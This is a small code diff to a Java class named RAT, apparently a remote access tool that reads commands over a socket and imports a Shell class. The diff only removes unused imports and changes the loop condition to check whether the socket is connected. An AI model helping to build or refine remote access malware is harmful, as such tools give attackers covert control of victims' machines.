@@ -1,10 +1,8 @@
 package connection;
 
-import java.io.BufferedReader;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
-import java.io.PrintWriter;
 import java.net.Socket;
 
 import control.Shell;
@@ -30,7 +28,7 @@ public class RAT {
 		} catch (IOException e1) {
 			return;
 		}
-		while(true)
+		while(s.isConnected())
         {  
 			try {
 				received = din.readUTF();
